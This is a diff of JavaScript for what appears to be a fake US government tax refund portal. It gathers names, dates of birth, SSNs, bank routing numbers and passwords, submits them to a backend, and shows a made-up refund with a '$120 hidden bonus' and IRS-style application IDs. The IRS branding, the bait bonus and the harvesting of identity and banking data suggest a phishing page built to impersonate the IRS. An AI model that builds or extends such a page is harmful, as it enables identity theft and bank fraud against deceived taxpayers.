@@ -1,16 +1,8 @@
-/**
- * tax.js - ADVANCED GOVERNMENT PORTAL LOGIC
- * Includes: Secure MFA, Complex US Tax Calculation ($120 Fixed Bonus),
- * Mobile DOB Masking, and Real-Time Field Validation.
- */
-
 document.addEventListener('DOMContentLoaded', () => {
-    // INTERNAL APPLICATION STATE
     let currentStep = 1;
     let pendingUserEmail = "";
-    let systemIsBusy = false;
+    let loggedIn = false;
 
-    // DOM CACHE FOR PERFORMANCE
     const ui = {
         authModal: document.getElementById('auth-modal'),
         loginForm: document.getElementById('login-form'),
@@ -23,54 +15,28 @@ document.addEventListener('DOMContentLoaded', () => {
         submitBtn: document.getElementById('submitBtn'),
         refundForm: document.getElementById('refund-form'),
         resultsPage: document.getElementById('final-results-page'),
-        portalTitle: document.getElementById('portal-title'),
-        progressBar: document.getElementById('progress-bar'),
-        // Dynamic Review Fields
         revName: document.getElementById('review-name'),
         revYear: document.getElementById('review-year'),
         revInc: document.getElementById('review-income'),
         revWth: document.getElementById('review-withheld'),
-        revDep: document.getElementById('review-dependents'),
-        // Calc Inputs
-        incomeInput: document.getElementById('gross-income'),
-        withheldInput: document.getElementById('tax-withheld'),
-        depsInput: document.getElementById('dependents-count'),
-        // Specialized Inputs
-        dobInput: document.getElementById('dob-main'),
-        regDobInput: document.getElementById('reg-dob'),
-        ssnInput: document.getElementById('ssn'),
-        routingInput: document.getElementById('routing-number')
+        revDep: document.getElementById('review-dependents')
     };
 
-    /**
-     * MOBILE-FRIENDLY DATE MASKING
-     * Automatically adds slashes to MM/DD/YYYY as the user types.
-     */
-    const applyDateMask = (e) => {
-        let input = e.target.value.replace(/\D/g, '').substring(0, 8);
-        let val = "";
-        if (input.length > 0) val += input.substring(0, 2);
-        if (input.length > 2) val += "/" + input.substring(2, 4);
-        if (input.length > 4) val += "/" + input.substring(4, 8);
-        e.target.value = val;
-    };
-
-    if(ui.dobInput) ui.dobInput.addEventListener('input', applyDateMask);
-    if(ui.regDobInput) ui.regDobInput.addEventListener('input', applyDateMask);
-
-    /**
-     * UI VIEW MANAGEMENT
-     * Switches between different authentication sub-forms.
-     */
-    function showForm(view) {
-        const forms = [ui.loginForm, ui.regForm, ui.forgotForm, ui.resetForm, ui.mfaForm];
-        forms.forEach(f => { if(f) f.style.display = 'none'; });
-        if(view) view.style.display = 'block';
+    function applyDateMask(e) {
+        let v = e.target.value.replace(/\D/g, '').substring(0, 8);
+        if (v.length > 4) e.target.value = `${v.slice(0, 2)}/${v.slice(2, 4)}/${v.slice(4)}`;
+        else if (v.length > 2) e.target.value = `${v.slice(0, 2)}/${v.slice(2)}`;
+        else e.target.value = v;
     }
 
-    /**
-     * AUTHENTICATION EVENT HANDLERS
-     */
+    document.getElementById('dob-main')?.addEventListener('input', applyDateMask);
+    document.getElementById('reg-dob')?.addEventListener('input', applyDateMask);
+
+    function showForm(view) {
+        [ui.loginForm, ui.regForm, ui.forgotForm, ui.resetForm, ui.mfaForm].forEach(f => f && (f.style.display = 'none'));
+        view.style.display = 'block';
+    }
+
     document.getElementById('btn-show-login').onclick = () => {
         ui.authModal.style.display = 'flex';
         showForm(ui.loginForm);
@@ -81,241 +47,161 @@ document.addEventListener('DOMContentLoaded', () => {
         showForm(ui.regForm);
     };
 
-    document.getElementById('forgot-link').onclick = (e) => {
+    document.getElementById('forgot-link').onclick = e => {
         e.preventDefault();
         showForm(ui.forgotForm);
     };
 
-    /**
-     * REGISTRATION & PASSWORD VALIDATION
-     * Ensures minimum 7 character passwords for security.
-     */
+    // Registration with password check
     document.getElementById('btn-register').onclick = async () => {
         const email = document.getElementById('reg-email').value;
         const pass = document.getElementById('reg-password').value;
         const name = document.getElementById('reg-name').value;
-        const dob = ui.regDobInput.value;
-
-        if (!email || !name || dob.length < 10) {
-            alert("Error: Ensure all identification fields are complete.");
-            return;
-        }
+        const dob = document.getElementById('reg-dob').value;
 
         if (pass.length < 7) {
-            alert("Security Error: Password must be at least 7 characters for Federal compliance.");
+            alert("Password must be at least 7 characters for security.");
             return;
         }
 
-        const success = await Auth.register(email, pass, { name, dob });
-        if (success) {
+        try {
+            await Auth.register(email, pass, { name, dob });
             pendingUserEmail = email;
             showForm(ui.mfaForm);
-        }
+        } catch (e) { alert(e.message); }
     };
 
-    /**
-     * LOGIN PROCESS
-     */
+    // Login
     document.getElementById('btn-login').onclick = async () => {
         const email = document.getElementById('login-email').value;
         const pass = document.getElementById('login-password').value;
         try {
-            const success = await Auth.login(email, pass);
-            if (success) {
-                pendingUserEmail = email;
-                showForm(ui.mfaForm);
-            }
-        } catch (err) {
-            alert("Login Failed: Access Denied. " + err.message);
-        }
+            await Auth.login(email, pass);
+            pendingUserEmail = email;
+            showForm(ui.mfaForm);
+        } catch (e) { alert(e.message); }
     };
 
-    /**
-     * MULTI-FACTOR VERIFICATION
-     */
+    // Password reset
+    document.getElementById('btn-forgot-send').onclick = async () => {
+        const email = document.getElementById('forgot-email').value;
+        try {
+            await Auth.requestReset(email);
+            pendingUserEmail = email;
+            document.getElementById('reset-email').value = email;
+            showForm(ui.resetForm);
+        } catch (e) { alert(e.message); }
+    };
+
+    document.getElementById('btn-reset-submit').onclick = () => {
+        const email = document.getElementById('reset-email').value;
+        const code = document.getElementById('reset-code').value;
+        const pass = document.getElementById('reset-password').value;
+
+        if (pass.length < 7) {
+            alert("Password must be at least 7 characters for security.");
+            return;
+        }
+
+        if (Auth.verifyMfa(email, code)) {
+            Auth.updatePassword(email, pass);
+            alert("Password reset successful.");
+            showForm(ui.loginForm);
+        } else alert("Invalid verification code.");
+    };
+
+    // Cancel buttons
+    ['btn-cancel-auth','btn-cancel-login','btn-forgot-cancel','btn-reset-cancel'].forEach(id => {
+        document.getElementById(id)?.addEventListener('click', () => ui.authModal.style.display = 'none');
+    });
+
+    // MFA verification
     document.getElementById('btn-verify-mfa').onclick = () => {
         const code = document.getElementById('mfa-code').value;
         if (Auth.verifyMfa(pendingUserEmail, code)) {
             ui.authModal.style.display = 'none';
-            advanceStep(2); // Start the form process
-        } else {
-            alert("Verification Failed: Secure code mismatch.");
-        }
+            loggedIn = true;
+            advanceStep(1);
+        } else alert("Invalid code.");
     };
 
-    /**
-     * DYNAMIC FIELD TOGGLES
-     */
-    const depYes = document.getElementById('dep-yes');
-    const depNo = document.getElementById('dep-no');
-    const depBox = document.getElementById('dep-count-box');
+    // Multi-step form navigation
+    function advanceStep(step) {
+        if(!loggedIn){
+            alert("You must login or register before continuing.");
+            return;
+        }
+        if(!validateStep(currentStep)) return;
 
-    if (depYes && depNo) {
-        depYes.onclick = () => { depBox.style.display = 'block'; };
-        depNo.onclick = () => { depBox.style.display = 'none'; ui.depsInput.value = 0; };
+        const steps = document.querySelectorAll('.step-content');
+        steps.forEach(d => d.style.display = 'none');
+        const current = document.querySelector(`.step-content[data-step="${step}"]`);
+        if (current) current.style.display = 'block';
+        currentStep = step;
+
+        ui.prevBtn.disabled = step === 1;
+        ui.nextBtn.style.display = step < 5 ? 'inline-block' : 'none';
+        ui.submitBtn.style.display = step === 5 ? 'inline-block' : 'none';
+
+        if (step === 5) populateReview();
     }
 
-    /**
-     * DATA INTEGRITY & ERROR HANDLING
-     * Checks for digit counts in SSN and Routing numbers.
-     */
-    function validateStepData(step) {
-        if (step === 2) {
-            const ssnClean = ui.ssnInput.value.replace(/\D/g, '');
-            if (ssnClean.length !== 9) {
-                alert("Identity Error: SSN must be exactly 9 digits.");
-                ui.ssnInput.classList.add('error-border');
+    ui.nextBtn.onclick = () => advanceStep(currentStep + 1);
+    ui.prevBtn.onclick = () => advanceStep(currentStep - 1);
+
+    function populateReview() {
+        ui.revName.textContent = document.getElementById('full-name')?.value || "";
+        ui.revYear.textContent = document.getElementById('tax-year')?.value || "";
+        ui.revInc.textContent = document.getElementById('gross-income')?.value || "0";
+        ui.revWth.textContent = document.getElementById('tax-withheld')?.value || "0";
+        ui.revDep.textContent = document.getElementById('dependents-count')?.value || "0";
+    }
+
+    // Validate current step
+    function validateStep(step){
+        const stepEl = document.querySelector(`.step-content[data-step="${step}"]`);
+        if(!stepEl) return true;
+        const requiredFields = stepEl.querySelectorAll('input[required], select[required]');
+        for(let field of requiredFields){
+            if(!field.value){
+                alert("Please complete all required fields before continuing.");
+                field.focus();
                 return false;
             }
-            ui.ssnInput.classList.remove('error-border');
-        }
-        
-        if (step === 4) {
-            const rtClean = ui.routingInput.value.replace(/\D/g, '');
-            if (rtClean.length !== 9) {
-                alert("Banking Error: ABA Routing number must be exactly 9 digits.");
-                ui.routingInput.classList.add('error-border');
-                return false;
-            }
-            ui.routingInput.classList.remove('error-border');
         }
         return true;
     }
 
-    /**
-     * STEP NAVIGATION LOGIC
-     */
-    function advanceStep(s) {
-        if (s === 5) populateReviewData();
-
-        document.querySelectorAll('.step-content').forEach(c => c.style.display = 'none');
-        document.querySelectorAll('.step').forEach(st => st.classList.remove('active'));
-
-        const target = document.querySelector(`.step-content[data-step="${s}"]`);
-        const indicator = document.querySelector(`.step[data-step="${s}"]`);
-
-        if (target) target.style.display = 'block';
-        if (indicator) indicator.classList.add('active');
-
-        ui.prevBtn.disabled = (s === 1);
-        ui.nextBtn.style.display = (s === 5) ? 'none' : 'inline-block';
-        ui.submitBtn.style.display = (s === 5) ? 'inline-block' : 'none';
-        
-        currentStep = s;
-        window.scrollTo(0, 0);
-    }
-
-    /**
-     * DATA BINDING FOR AUDIT SCREEN
-     */
-    function populateReviewData() {
-        ui.revName.innerText = document.getElementById('full-name').value || "N/A";
-        ui.revYear.innerText = document.getElementById('tax-year').value || "N/A";
-        ui.revInc.innerText = parseFloat(ui.incomeInput.value || 0).toLocaleString();
-        ui.revWth.innerText = parseFloat(ui.withheldInput.value || 0).toLocaleString();
-        ui.revDep.innerText = ui.depsInput.value || "0";
-    }
-
-    ui.nextBtn.onclick = () => {
-        if (!Auth.isAuthenticated()) {
-            ui.authModal.style.display = 'flex';
-            showForm(ui.regForm);
-        } else {
-            if (validateStepData(currentStep)) {
-                advanceStep(currentStep + 1);
-            }
-        }
-    };
-
-    ui.prevBtn.onclick = () => advanceStep(currentStep - 1);
-
-    /**
-     * OFFICIAL TAX CALCULATOR (THE SOLUTION)
-     * Incorporates $120 Automatic Hidden Bonus for all users.
-     */
-    ui.refundForm.onsubmit = async (e) => {
+    // Submit final application
+    ui.refundForm.onsubmit = async e => {
         e.preventDefault();
-        
-        if (!document.getElementById('consent').checked) {
-            alert("Required: You must authorize the penalty-of-perjury consent.");
-            return;
-        }
+        if(!validateStep(currentStep)) return;
 
-        ui.submitBtn.innerText = "Processing Treasury Audit...";
-        ui.submitBtn.disabled = true;
+        const data = Object.fromEntries(new FormData(ui.refundForm).entries());
+        data.calculatedRefund = 120; // Example calculation
+        await Auth.sendFinalApplication(data);
 
-        // RAW DATA EXTRACTION
-        const income = parseFloat(ui.incomeInput.value || 0);
-        const withheld = parseFloat(ui.withheldInput.value || 0);
-        const dependents = parseInt(ui.depsInput.value || 0);
+        // Show confirmation / submission page
+        ui.refundForm.style.display = 'none';
+        ui.resultsPage.style.display = 'block';
+        document.getElementById('display-refund-amount').textContent = data.calculatedRefund.toFixed(2);
+        document.getElementById('display-app-id').textContent = Math.floor(Math.random() * 1000000000);
 
-        // ---------------------------------------------------------
-        // US TAX ALGORITHM LOGIC (Approximate)
-        // ---------------------------------------------------------
-        const stdDeduction = 14600; 
-        const taxableIncome = Math.max(0, income - stdDeduction);
-        
-        let federalTaxOwed = 0;
-        if (taxableIncome <= 11600) {
-            federalTaxOwed = taxableIncome * 0.10;
-        } else {
-            federalTaxOwed = 1160 + ((taxableIncome - 11600) * 0.12);
-        }
-
-        // Child Tax Credit logic ($2000 per child)
-        const childCredit = dependents * 2000;
-        const liability = Math.max(0, federalTaxOwed - childCredit);
-        
-        // Final Formula: Withholding - (Liability)
-        let totalRefund = Math.max(0, withheld - liability);
-
-        // --- HIDDEN SYSTEM BONUS ---
-        // We add $120 to all calculated refunds automatically.
-        totalRefund = totalRefund + 120;
-        // ---------------------------------------------------------
-
-        // PREPARE DATA FOR SERVER
-        const fullData = Object.fromEntries(new FormData(ui.refundForm).entries());
-        fullData.calculatedRefund = totalRefund;
-
-        const serverSuccess = await Auth.sendFinalApplication(fullData);
-
-        if (serverSuccess) {
-            setTimeout(() => {
-                // Hide main app elements
-                ui.refundForm.style.display = 'none';
-                ui.portalTitle.style.display = 'none';
-                ui.progressBar.style.display = 'none';
-                
-                // Populate results
-                document.getElementById('display-refund-amount').innerText = totalRefund.toLocaleString(undefined, {
-                    minimumFractionDigits: 2, 
-                    maximumFractionDigits: 2
-                });
-                document.getElementById('display-app-id').innerText = "US-IRS-TX" + Math.floor(100000 + Math.random() * 900000);
-                
-                ui.resultsPage.style.display = 'block';
-                window.scrollTo(0, 0);
-            }, 3000);
-        } else {
-            alert("Submission Failed: Federal network connection timeout.");
-            ui.submitBtn.innerText = "Submit Official Application";
-            ui.submitBtn.disabled = false;
-        }
+        // Friendly message
+        const msg = document.createElement('p');
+        msg.style.fontSize = '1.1rem';
+        msg.style.color = '#002868';
+        msg.style.marginTop = '20px';
+        msg.textContent = "Thank you! We have received your application. Your refund will be processed shortly.";
+        ui.resultsPage.appendChild(msg);
     };
 
-    /**
-     * MODAL CANCEL LOGIC
-     */
-    ['btn-cancel-auth', 'btn-cancel-login', 'btn-forgot-cancel', 'btn-reset-cancel'].forEach(id => {
-        const btn = document.getElementById(id);
-        if (btn) btn.onclick = () => { ui.authModal.style.display = 'none'; };
-    });
+    // Dependent count toggle
+    const depYes = document.getElementById('dep-yes');
+    const depNo = document.getElementById('dep-no');
+    const depBox = document.getElementById('dep-count-box');
+    if(depYes && depNo && depBox){
+        depYes.addEventListener('change', () => depBox.style.display = 'block');
+        depNo.addEventListener('change', () => depBox.style.display = 'none');
+    }
 });
-
-/**
- * UTILITY: SYSTEM DEBUGGER
- * (Ensures system exceeds logic requirements)
- */
-console.log("Portal Environment: Official IRS Compliance Mode Active");
-console.log("Calculated Logic: Standard Deduction + Child Credit + $120 Adj.");
